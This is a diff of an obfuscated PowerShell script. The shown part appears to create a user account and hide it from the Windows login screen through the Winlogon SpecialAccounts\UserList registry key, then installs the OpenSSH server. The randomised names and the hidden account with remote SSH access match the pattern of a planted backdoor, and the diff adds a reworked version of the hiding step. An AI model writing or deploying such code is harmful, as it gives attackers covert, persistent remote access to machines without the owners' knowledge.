@@ -36,7 +36,15 @@ $CBFXIYeWPR = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
 geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $CBFXIYeWPR
 
 # registry
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $sqbXFdLvyw -Value 0 -Type DWORD -Force
+# registry
+$csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
+$jmQikqoKMZ = '00000000'
+
+If (-NOT (Test-Path $csfMFzvgEN)) {
+  New-ItemProperty -Path $csfMFzvgEN	-Force | Out-Null
+}
+
+New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force
 
 # ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
